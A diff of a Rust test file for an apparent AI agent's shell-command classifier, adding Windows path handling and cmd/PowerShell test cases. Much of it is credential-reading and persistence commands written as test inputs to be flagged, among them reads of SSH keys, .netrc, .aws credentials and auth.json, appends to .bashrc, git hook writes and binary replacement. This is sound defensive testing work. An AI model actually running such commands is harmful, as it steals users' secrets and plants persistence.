@@ -2,12 +2,26 @@ use super::*;
 use crate::sandboxing::SandboxPermissions;
 use codex_utils_absolute_path::AbsolutePathBuf;
 use pretty_assertions::assert_eq;
+use std::path::PathBuf;
 
 const HOME: &str = "/home/fixture/.corbanu";
 const USER_HOME: &str = "/home/fixture";
 
+/// A fixture path: as written, but on Windows (#1240) a POSIX path without a
+/// drive is on drive `C:` (`/work` is `C:\work`). Command text keeps POSIX
+/// paths: on Windows `/home/fixture` is on the working folder's drive.
+fn fixture(path: &str) -> PathBuf {
+    if cfg!(windows) && !Path::new(path).is_absolute() {
+        PathBuf::from(format!("C:{}", path.replace('/', "\\")))
+    } else {
+        PathBuf::from(path)
+    }
+}
+
 fn abs(path: &str) -> PathUri {
-    PathUri::from_abs_path(&AbsolutePathBuf::from_absolute_path_checked(path).expect("absolute"))
+    PathUri::from_abs_path(
+        &AbsolutePathBuf::from_absolute_path_checked(fixture(path)).expect("absolute"),
+    )
 }
 
 fn shell_in(cwd: &str, command: &[&str]) -> ApprovalAction {
@@ -23,7 +37,7 @@ fn shell_in(cwd: &str, command: &[&str]) -> ApprovalAction {
 }
 
 fn classify_fixture(action: &ApprovalAction) -> Option<ProtectedActionKind> {
-    classify_with(action, Path::new(HOME), Some(Path::new(USER_HOME)))
+    classify_with(action, &fixture(HOME), Some(&fixture(USER_HOME)))
 }
 
 fn kind(command: &[&str]) -> Option<ProtectedActionKind> {
@@ -35,10 +49,6 @@ fn script(script: &str) -> Option<ProtectedActionKind> {
 }
 
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn pf_30_s03_vault_credential_and_policy_commands_are_protected() {
     use ProtectedActionKind::*;
     let cases: &[(&str, ProtectedActionKind)] = &[
@@ -168,7 +178,7 @@ fn pf_30_s03_vault_credential_and_policy_commands_are_protected() {
 #[test]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows a lone `*` matches the whole home in the first judgment (SecurityPolicy)"
 )]
 fn pf_30_s03_ordinary_commands_are_not_protected() {
     for command in [
@@ -205,10 +215,6 @@ fn pf_30_s03_ordinary_commands_are_not_protected() {
 }
 
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn pf_30_s03_patches_into_the_home_or_credential_files_are_protected() {
     let patch = |files: &[&str]| ApprovalAction::ApplyPatch {
         id: "call".into(),
@@ -237,17 +243,13 @@ fn pf_30_s03_patches_into_the_home_or_credential_files_are_protected() {
 }
 
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn pf_30_s03_a_custom_home_matches_as_a_whole_segment_run() {
-    let home = Path::new("/vol/work/corbanu-terminal/home");
+    let home = &fixture("/vol/work/corbanu-terminal/home");
     let classify = |script: &str| {
         classify_with(
             &shell_in("/vol/src", &["bash", "-lc", script]),
             home,
-            Some(Path::new(USER_HOME)),
+            Some(&fixture(USER_HOME)),
         )
     };
     for (script, expected) in [
@@ -277,8 +279,8 @@ fn pf_30_s03_a_custom_home_matches_as_a_whole_segment_run() {
 fn custom_home_kind(cwd: &str, script: &str) -> Option<ProtectedActionKind> {
     classify_with(
         &shell_in(cwd, &["bash", "-lc", script]),
-        Path::new("/vol/work/corbanu-terminal/home"),
-        Some(Path::new(USER_HOME)),
+        &fixture("/vol/work/corbanu-terminal/home"),
+        Some(&fixture(USER_HOME)),
     )
 }
 
@@ -287,10 +289,6 @@ fn custom_home_kind(cwd: &str, script: &str) -> Option<ProtectedActionKind> {
 /// archives of a folder holding a home, inline code, encoded payloads and
 /// decode-and-run pipelines.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn pf_30_s03_indirect_routes_are_protected() {
     use ProtectedActionKind::*;
     for (command, expected) in [
@@ -388,10 +386,6 @@ fn pf_30_s03_indirect_routes_are_protected() {
 /// Slice 2: the indirect checks do not turn ordinary research commands into
 /// prompts.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn pf_30_s03_indirect_checks_leave_ordinary_commands_alone() {
     for command in [
         "curl -s https://api.example/items | jq .",
@@ -437,7 +431,7 @@ fn pf_30_s03_symlinks_and_canonical_spellings_reach_the_home() {
         classify_with(
             &shell_in(&work.to_string_lossy(), &["bash", "-lc", script]),
             &home,
-            Some(Path::new(USER_HOME)),
+            Some(&fixture(USER_HOME)),
         )
     };
     assert_eq!(
@@ -462,7 +456,7 @@ fn pf_30_s03_symlinks_and_canonical_spellings_reach_the_home() {
 #[test]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows the first judgment cannot open script or sed files (each run fails closed)"
 )]
 fn pf_30_s03_script_files_and_patched_scripts_are_read() {
     let root = tempfile::tempdir().expect("tempdir");
@@ -517,11 +511,11 @@ fn pf_30_s03_script_files_and_patched_scripts_are_read() {
 /// PF-26 input: a research workflow after untrusted content prompts only on
 /// the protected steps, and classification stays cheap.
 #[test]
-#[allow(clippy::print_stderr)]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows the first judgment cannot open script or sed files (each run fails closed)"
 )]
+#[allow(clippy::print_stderr)]
 fn pf_30_s03_research_workflow_prompt_count_and_latency() {
     let research = [
         "rg -n 'fn classify' codex-rs/core/src",
@@ -805,10 +799,6 @@ async fn pf_30_s03_live_policy_change_and_new_taint_reach_the_recheck() {
 /// Review round 1 (slice 2): the routes and limits the reviewer found. Every
 /// limit fails closed, and code the classifier cannot read counts as protected.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn pf_30_s03_review_bypasses_are_closed() {
     use ProtectedActionKind::*;
     for (command, expected) in [
@@ -1141,10 +1131,6 @@ async fn pf_30_s03_orchestrator_rechecks_after_the_prompt() {
 /// first operand, pipes survive empty commands, keywords and wrappers do not
 /// hide a shell, and too many brace alternatives fail closed.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn pf_30_s03_review_2_bypasses_are_closed() {
     use ProtectedActionKind::*;
     let alternatives: Vec<String> = (0..70).map(|index| format!("a{index}")).collect();
@@ -1255,10 +1241,6 @@ fn pf_30_s03_everyday_commands_stay_quiet() {
 /// in a group, `$PWD` follows `cd`, wrappers have their own options, more
 /// interpreters and attached inline code are recognised.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn pf_30_s03_review_3_bypasses_are_closed() {
     use ProtectedActionKind::*;
     for command in [
@@ -1335,10 +1317,6 @@ fn pf_30_s03_review_3_bypasses_are_closed() {
 /// PF-23-S01: value transfers, and local content sent to another machine,
 /// are protected; literal request bodies and requests to this machine are not.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn pf_23_s01_value_transfer_and_outbound_content_are_protected() {
     use ProtectedActionKind::*;
     for (command, expected) in [
@@ -1476,10 +1454,6 @@ fn pf_23_s01_value_transfer_and_outbound_content_are_protected() {
 /// PF-23-S01 review round 3: many places a command could start fail closed
 /// quickly instead of judging each one.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn pf_23_s01_wrapper_positions_are_bounded() {
     // Linear work, counted at two sizes (#1102).
     work::assert_linear("npx words", |scale| {
@@ -1495,10 +1469,6 @@ fn pf_23_s01_wrapper_positions_are_bounded() {
 /// PF-23-S02: writing a file that runs code later outside the sandbox is
 /// protected; reading it, and ordinary writes, are not.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn pf_23_s02_persistence_writes_are_protected() {
     use ProtectedActionKind::*;
     for command in [
@@ -1566,10 +1536,6 @@ fn pf_23_s02_persistence_writes_are_protected() {
 /// the Corbanu home as `$CODEX_HOME` does, so reading through them is a
 /// protected action too (it drew no approval prompt before).
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn issue_442_corbanu_home_variables_name_the_home() {
     use ProtectedActionKind::SecurityPolicy;
     for command in [
@@ -1621,7 +1587,7 @@ fn issue_442_aggressive_credential_reads_say_they_are_never_granted() {
 #[test]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows the first judgment cannot open script or sed files (each run fails closed)"
 )]
 fn issue_841_sed_edits_are_not_unseen_code() {
     let dir = tempfile::tempdir().unwrap();
@@ -1825,7 +1791,7 @@ fn issue_885_wrong(cwd: &str, cases: &[(&str, Option<ProtectedActionKind>)]) -> 
 #[test]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows the first judgment cannot open script or sed files (each run fails closed)"
 )]
 fn issue_885_sed_that_runs_commands_is_unseen_code() {
     let (_dir, cwd) = issue_885_fixture();
@@ -1898,7 +1864,7 @@ fn issue_885_sed_that_runs_commands_is_unseen_code() {
 #[test]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows the first judgment cannot open script or sed files (each run fails closed)"
 )]
 fn issue_885_nested_shell_scripts_are_judged() {
     let (_dir, cwd) = issue_885_fixture();
@@ -1953,7 +1919,7 @@ fn issue_885_nested_shell_scripts_are_judged() {
 #[test]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows the first judgment cannot open script or sed files (each run fails closed)"
 )]
 fn issue_885_sed_writing_a_file_the_line_runs_is_unseen_code() {
     let (_dir, cwd) = issue_885_fixture();
@@ -1985,7 +1951,7 @@ fn issue_885_sed_writing_a_file_the_line_runs_is_unseen_code() {
 #[test]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows the first judgment cannot open script or sed files (each run fails closed)"
 )]
 fn issue_885_review_1_routes_and_limits() {
     let (_dir, cwd) = issue_885_fixture();
@@ -2058,7 +2024,7 @@ fn issue_885_review_1_routes_and_limits() {
 #[test]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows the first judgment cannot open script or sed files (each run fails closed)"
 )]
 fn issue_885_review_2_routes_and_limits() {
     let (_dir, cwd) = issue_885_fixture();
@@ -2128,7 +2094,7 @@ fn issue_885_review_2_routes_and_limits() {
 #[test]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows the first judgment cannot open script or sed files (each run fails closed)"
 )]
 fn issue_885_review_3_routes() {
     let (_dir, cwd) = issue_885_fixture();
@@ -2221,10 +2187,6 @@ fn issue_885_review_3_routes() {
 /// `a[$(touch hit)0]` (zsh: `path[...]`): checked with bash 3.2 and 5.2
 /// (`mapfile`), zsh 5.9 and ksh93.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn issue_937_arithmetic_on_filled_variables_is_unseen_code() {
     use ProtectedActionKind::UnseenCode;
     let bash = [
@@ -2316,10 +2278,6 @@ fn issue_937_arithmetic_on_filled_variables_is_unseen_code() {
 /// #937: loop counters, values from literals or from commands the
 /// classifier can read, and filled variables used as plain text still run.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn issue_937_counters_and_plain_uses_are_not_unseen_code() {
     let mut wrong = Vec::new();
     for shell in ["bash", "zsh"] {
@@ -2351,7 +2309,7 @@ fn issue_937_counters_and_plain_uses_are_not_unseen_code() {
 #[test]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows a lone `*` matches the whole home in the first judgment (SecurityPolicy)"
 )]
 fn issue_937_review_1_routes() {
     use ProtectedActionKind::UnseenCode;
@@ -2423,10 +2381,6 @@ fn issue_937_review_1_routes() {
 
 /// #937 review 1: everyday lines near the new routes still run.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn issue_937_review_1_everyday_lines_still_run() {
     let mut wrong = Vec::new();
     for shell in ["bash", "zsh"] {
@@ -2455,7 +2409,7 @@ fn issue_937_review_1_everyday_lines_still_run() {
 #[test]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows a lone `*` matches the whole home in the first judgment (SecurityPolicy)"
 )]
 fn issue_937_review_2_routes() {
     use ProtectedActionKind::UnseenCode;
@@ -2538,7 +2492,7 @@ fn issue_937_review_2_routes() {
 #[test]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows a lone `*` matches the whole home in the first judgment (SecurityPolicy)"
 )]
 fn issue_937_review_2_everyday_lines_still_run() {
     let mut wrong = Vec::new();
@@ -2574,7 +2528,7 @@ fn issue_937_review_2_everyday_lines_still_run() {
 #[test]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows a lone `*` matches the whole home in the first judgment (SecurityPolicy)"
 )]
 fn issue_937_review_6_fallback_routes() {
     use ProtectedActionKind::UnseenCode;
@@ -2660,10 +2614,6 @@ fn issue_937_review_6_fallback_routes() {
 /// #1020: the shell reader stops nesting substitutions past a depth, so deep
 /// nesting stays fast, and the line asks.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn issue_1020_deep_substitutions_stay_fast_and_ask() {
     use ProtectedActionKind::*;
     let lex = |text: &str| shell::simple_commands(&["bash".into(), "-c".into(), text.into()]);
@@ -2765,10 +2715,6 @@ fn issue_1020_deep_substitutions_stay_fast_and_ask() {
 /// #1020: a line nesting `$(` 400 deep took about 6 s to read on main; the
 /// work now grows linearly with the depth (counted at two sizes, #1102).
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn issue_1020_deep_nesting_is_classified_quickly() {
     work::assert_linear("deep nesting", |scale| {
         let found = script(&format!("echo {}", "$(".repeat(100 * scale)));
@@ -2779,10 +2725,6 @@ fn issue_1020_deep_nesting_is_classified_quickly() {
 /// #1012: bash `${v@P}` runs the command substitutions in the value, like
 /// `eval`, so after untrusted content it is code the user hasn't seen.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn issue_1012_prompt_transformation_is_unseen_code() {
     use ProtectedActionKind::*;
     let mut wrong = Vec::new();
@@ -2845,7 +2787,7 @@ fn issue_1012_prompt_transformation_is_unseen_code() {
 #[test]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows a lone `*` matches the whole home in the first judgment (SecurityPolicy)"
 )]
 fn issue_1084_glob_substitution_is_unseen_code() {
     use ProtectedActionKind::*;
@@ -3131,15 +3073,15 @@ fn issue_932_zsh_lines_of_proven_data_skip_the_zsh_only_checks() {
 #[test]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows a lone `*` matches the whole home in the first judgment (SecurityPolicy)"
 )]
 fn d85_zsh_only_checks_ask_only_where_zsh_may_run() {
     use ProtectedActionKind::*;
     let named = |command: &[&str]| {
         classify_as_named_with(
             &shell_in("/work", command),
-            Path::new(HOME),
-            Some(Path::new(USER_HOME)),
+            &fixture(HOME),
+            Some(&fixture(USER_HOME)),
         )
     };
     let mut wrong = Vec::new();
@@ -3324,7 +3266,7 @@ fn d85_zsh_only_checks_ask_only_where_zsh_may_run() {
 #[test]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows a lone `*` matches the whole home in the first judgment (SecurityPolicy)"
 )]
 fn issue_1028_glob_qualifiers_that_run_code_are_unseen_code() {
     use ProtectedActionKind::*;
@@ -3486,10 +3428,6 @@ fn issue_1028_glob_qualifiers_that_run_code_are_unseen_code() {
 /// bound; past `MAX_SUBSTITUTED_BYTES` substituted bytes the line asks.
 /// Inputs stay small (at most 16 MiB on a build without the cap).
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn issue_1065_substituted_values_are_capped() {
     use ProtectedActionKind::*;
     let doubled = |steps: usize| format!("a=x;{} echo ok", " a=$a$a;".repeat(steps));
@@ -3525,10 +3463,6 @@ fn issue_1065_substituted_values_are_capped() {
 /// past it still names what it reaches, and folders and nested text are
 /// bounded too. Inputs stay small (at most about 6 MB of words).
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn issue_1065_review_1_limits() {
     use ProtectedActionKind::*;
     use base64::Engine as _;
@@ -3590,17 +3524,13 @@ fn issue_1065_review_1_limits() {
 /// small values past the budget build at most a bounded value. Counted by
 /// command lines and bytes lexed, not by time.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn issue_1065_review_2_large_values_are_judged_once() {
     use ProtectedActionKind::*;
     let counts = |line: &str| {
         let classifier = classified(
             &shell_in("/work", &["bash", "-lc", line]),
-            Path::new(HOME),
-            Some(Path::new(USER_HOME)),
+            &fixture(HOME),
+            Some(&fixture(USER_HOME)),
             /*as_named*/ false,
         );
         (
@@ -3638,10 +3568,6 @@ fn issue_1065_review_2_large_values_are_judged_once() {
 /// git (or a pager or editor it starts) runs is code the classifier does not
 /// read.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn issue_1141_output_files_are_written() {
     use ProtectedActionKind::*;
     for command in [
@@ -3682,7 +3608,7 @@ fn issue_1141_output_files_are_written() {
 #[test]
 #[cfg_attr(
     windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+    ignore = "#1261: on Windows a lone `*` matches the whole home in the first judgment (SecurityPolicy)"
 )]
 fn issue_1142_git_code_settings_are_unseen_code() {
     let unseen = Some(ProtectedActionKind::UnseenCode);
@@ -3791,10 +3717,6 @@ fn issue_1142_git_code_settings_are_unseen_code() {
 
 /// #1142 review round 3: a flag group cut inside a character.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn issue_1142_flag_groups_cut_inside_a_character() {
     let line = format!("echo ${{({}\u{e9})}} a=1", "h".repeat(63));
     let _ = script(&line);
@@ -3813,10 +3735,6 @@ macro_rules! issue_1141_1142_checks_are_linear {
                     use super::*;
 
                     #[test]
-                    #[cfg_attr(
-                        windows,
-                        ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-                    )]
                     fn in_git_lines() {
                         work::assert_linear(concat!(stringify!($name), " in git lines"), |scale| {
                             let _ = script(&format!("git {} status", $unit.repeat(400 * scale)));
@@ -3824,10 +3742,6 @@ macro_rules! issue_1141_1142_checks_are_linear {
                     }
 
                     #[test]
-                    #[cfg_attr(
-                        windows,
-                        ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-                    )]
                     fn in_read_lines() {
                         work::assert_linear(concat!(stringify!($name), " in read lines"), |scale| {
                             let _ = script(&format!("read {}", $unit.repeat(400 * scale)));
@@ -3859,10 +3773,6 @@ issue_1141_1142_checks_are_linear! {
 /// exec path runs `git <subcommand>`, `git.exe` is git), and more git
 /// options and variables that name a file or folder git writes are writes.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn issue_1159_git_helpers_and_path_writes() {
     use ProtectedActionKind::*;
     for command in [
@@ -3935,10 +3845,6 @@ fn issue_1159_git_helpers_and_path_writes() {
 
 /// #1159: the git helper checks stay linear in the line's length.
 #[test]
-#[cfg_attr(
-    windows,
-    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
-)]
 fn issue_1159_checks_are_linear() {
     for (label, unit) in [
         ("git helpers", "git-config "),
@@ -3955,6 +3861,625 @@ fn issue_1159_checks_are_linear() {
             let _ = script(&line);
         });
     }
+}
+
+/// #1240: the Windows fixture: a Windows home, user home and working folder.
+const WINDOWS_HOME: &str = r"C:\Users\fixture\.corbanu";
+const WINDOWS_USER_HOME: &str = r"C:\Users\fixture";
+
+/// #1240: `command` run in `cwd` on Windows with `home` as the Corbanu home:
+/// on Windows through `classify_with`, elsewhere through the same two
+/// judgments with the Windows folder given as text.
+fn windows_kind_with(home: &str, cwd: &str, command: &[&str]) -> Option<ProtectedActionKind> {
+    let command: Vec<String> = command.iter().map(|part| (*part).to_string()).collect();
+    if cfg!(windows) {
+        let action = ApprovalAction::Shell {
+            id: "call".into(),
+            environment_id: "local".into(),
+            command,
+            cwd: PathUri::from_abs_path(
+                &AbsolutePathBuf::from_absolute_path_checked(cwd).expect("absolute"),
+            ),
+            sandbox_permissions: SandboxPermissions::UseDefault,
+            additional_permissions: None,
+            justification: None,
+        };
+        classify_with(&action, Path::new(home), Some(Path::new(WINDOWS_USER_HOME)))
+    } else {
+        classify_as_windows(
+            &command,
+            cwd,
+            Path::new(home),
+            Some(Path::new(WINDOWS_USER_HOME)),
+        )
+    }
+}
+
+fn windows_kind(command: &[&str]) -> Option<ProtectedActionKind> {
+    windows_kind_with(WINDOWS_HOME, r"C:\work", command)
+}
+
+fn cmd(line: &str) -> Option<ProtectedActionKind> {
+    windows_kind(&["cmd.exe", "/c", line])
+}
+
+fn powershell(line: &str) -> Option<ProtectedActionKind> {
+    windows_kind(&["powershell.exe", "-NoProfile", "-Command", line])
+}
+
+/// #1240: protected reads and writes spelled the Windows way (cmd and
+/// PowerShell, backslashes, drive letters, `%USERPROFILE%`,
+/// `$env:USERPROFILE`, `~\`, any letter case) are protected on Windows, as
+/// their POSIX spellings are everywhere. Runs on every platform.
+#[test]
+fn issue_1240_windows_spellings_are_protected() {
+    use ProtectedActionKind::*;
+    for (line, expected) in [
+        // The #1240 table.
+        (r"type C:\Users\fixture\.corbanu\auth.json", Credentials),
+        // Home variables and letter case.
+        (r"type %USERPROFILE%\.netrc", Credentials),
+        (r"type %userprofile%\.ssh\id_rsa", Credentials),
+        (r"type %HOMEDRIVE%%HOMEPATH%\.git-credentials", Credentials),
+        (r"type %CODEX_HOME%\auth.json", Credentials),
+        (r"TYPE C:\USERS\FIXTURE\.CORBANU\AUTH.JSON", Credentials),
+        (
+            r"more < C:\Users\Fixture\.Corbanu\Config.toml",
+            SecurityPolicy,
+        ),
+        (r"type C:\Users\fixture\.corbanu\vault\store", Vault),
+        // Writes: redirection, quotes, escapes, writing commands.
+        (r"echo x >> %USERPROFILE%\.bashrc", Persistence),
+        (r#"echo x>>"%USERPROFILE%\.bashrc""#, Persistence),
+        (r"echo x 1> C:\Users\fixture\.profile", Persistence),
+        (r"echo don't > C:\Users\fixture\.zshrc", Persistence),
+        (
+            r"copy C:\evil.txt %HOMEDRIVE%%HOMEPATH%\.gitconfig",
+            Persistence,
+        ),
+        (
+            r"copy /y evil C:\Users\fixture\.local\bin\git.exe",
+            Persistence,
+        ),
+        (r"cd /d %USERPROFILE% & echo x >> .bashrc", Persistence),
+        (r"cd C:\work\.git & echo x > hooks\pre-commit", Persistence),
+        (r"echo x > C:\work\.codex\config.toml", SecurityPolicy),
+        // Windows spellings of one file.
+        (r"type \\?\C:\Users\fixture\.corbanu\auth.json", Credentials),
+        (r"type \\localhost\C$\Users\fixture\.netrc", Credentials),
+        (r"type C:\Users\fixture\.netrc::$DATA", Credentials),
+        (r"echo x > C:\Users\fixture\.bashrc.", Persistence),
+        (
+            r"type C:\Users\fixture\.corbanu\.\x\..\auth.json",
+            Credentials,
+        ),
+        (r"echo x >> ..\Users\fixture\.bashrc", Persistence),
+        (r"echo x >> \Users\fixture\.bashrc", Persistence),
+        (r"echo x >> C:..\Users\fixture\.bashrc", Persistence),
+        // Folder trees holding a home.
+        (r"robocopy C:\Users\fixture D:\backup /E", Credentials),
+        (r"xcopy C:\Users D:\backup", Credentials),
+        // Programs named by their Windows path.
+        (r"C:\Tools\corbanu.exe vault list", Vault),
+        (
+            r#""C:\Program Files\Corbanu\corbanu.exe" vault get k"#,
+            Vault,
+        ),
+        (r"gh.exe auth token", Credentials),
+        (
+            r"C:\Git\cmd\git.exe config --global core.pager x",
+            Persistence,
+        ),
+        // cmd's substring forms are not expanded: they fail closed.
+        (r"type %USERPROFILE:~0%\.bashrc", UnseenCode),
+        // Review 1: folder changes anywhere, attached or after a prefix.
+        (
+            r"cmd /c cd /d %USERPROFILE% & echo x >> .bashrc",
+            Persistence,
+        ),
+        (r"@cd /d %USERPROFILE% & echo x >> .bashrc", Persistence),
+        (r"if 1==1 cd %USERPROFILE% & echo x >> .bashrc", Persistence),
+        (r"cd\Users\fixture & echo x >> .bashrc", Persistence),
+        (r#"cmd /c "echo x >> %USERPROFILE%\.bashrc""#, Persistence),
+        (
+            r"start /D %USERPROFILE% cmd /c echo x >> .bashrc",
+            Persistence,
+        ),
+        // Variables in a profile; climbing out of an unknown one fails closed.
+        (r"echo x >> %APPDATA%\..\..\.bashrc", Persistence),
+        (r"echo x >> %LOCALAPPDATA%\..\..\.zshrc", Persistence),
+        (r"echo x >> C:\Users\%USERNAME%\.bashrc", Persistence),
+        (r"echo x >> %TEMP%\..\..\..\.bashrc", UnseenCode),
+        (
+            r"echo x >> %SystemDrive%\Users\fixture\.bashrc",
+            Persistence,
+        ),
+        // Review 2: every folder the line has been in counts.
+        (r"cd /d %USERPROFILE% & echo x>>.bashrc cd x", Persistence),
+        (
+            r"cd /d %USERPROFILE% & cd.x & echo x>>..\.bashrc",
+            Persistence,
+        ),
+        (
+            r"cd /d %USERPROFILE% & pushd x & popd & echo x>>.bashrc",
+            Persistence,
+        ),
+        (
+            r#"start /D %USERPROFILE% cmd /c "echo a & echo x >> .bashrc""#,
+            Persistence,
+        ),
+        (r"xcopy /d %USERPROFILE% E:\b /e /i", Credentials),
+        // Review 3: a cd that fails or a popd leaves earlier folders possible.
+        (
+            r"cd /d %USERPROFILE%\AppData & pushd Local & popd & cd .. & echo x>>.bashrc",
+            Persistence,
+        ),
+        (
+            r"cd /d %USERPROFILE%\AppData && pushd Local && popd && cd .. && echo x>>.bashrc",
+            Persistence,
+        ),
+        (
+            r"cd /d %USERPROFILE%\AppData & cd nosuch & cd .. & echo x>>.bashrc",
+            Persistence,
+        ),
+        (r"cd/d %USERPROFILE% & echo x>>.bashrc", Persistence),
+        // Review 5: long spaced folders, `=` and `-x` folder names.
+        (
+            r"cd C:\work\1 2 3 4 5 6 7 8 9\..\..\Users\fixture & echo x >> .bashrc",
+            Persistence,
+        ),
+        (
+            r"cd C:\Users\fixture\a=b\.. & echo x >> .bashrc",
+            Persistence,
+        ),
+        (
+            r"cd -x\..\..\Users\fixture & echo x >> .bashrc",
+            Persistence,
+        ),
+        // Review 4: spaces in cmd's cd.
+        (
+            r"cd C:\Program Files\..\Users\fixture & echo x >> .bashrc",
+            Persistence,
+        ),
+    ] {
+        assert_eq!(cmd(line), Some(expected), "cmd /c {line}");
+    }
+    for (line, expected) in [
+        // The #1240 table.
+        (
+            r"Get-Content C:\Users\fixture\.corbanu\auth.json",
+            Credentials,
+        ),
+        (r"Get-Content $env:USERPROFILE\.ssh\id_ed25519", Credentials),
+        (r"Get-Content ~\.ssh\id_ed25519", Credentials),
+        // Parameters, variables and .NET calls.
+        (r"Get-Content -Path:C:\Users\fixture\.netrc", Credentials),
+        (
+            r"Get-Content -LiteralPath '${env:USERPROFILE}\.netrc'",
+            Credentials,
+        ),
+        (r#"Get-Content "$($env:USERPROFILE)\.netrc""#, Credentials),
+        (r"gc $Env:CODEX_HOME\auth.json", Credentials),
+        (r"Get-Content $HOME\.aws\credentials", Credentials),
+        (
+            r"[IO.File]::ReadAllText('C:\Users\fixture\.corbanu\auth.json')",
+            Credentials,
+        ),
+        (
+            r"Copy-Item C:\Users\fixture\.corbanu\auth.json C:\tmp",
+            Credentials,
+        ),
+        (r"Add-Content -Path $HOME\.bashrc -Value x", Persistence),
+        (
+            r"Set-Content -LiteralPath '${env:USERPROFILE}\.gitconfig' -Value x",
+            Persistence,
+        ),
+        (
+            r"'x' | Out-File -FilePath $env:USERPROFILE\.zshrc -Append",
+            Persistence,
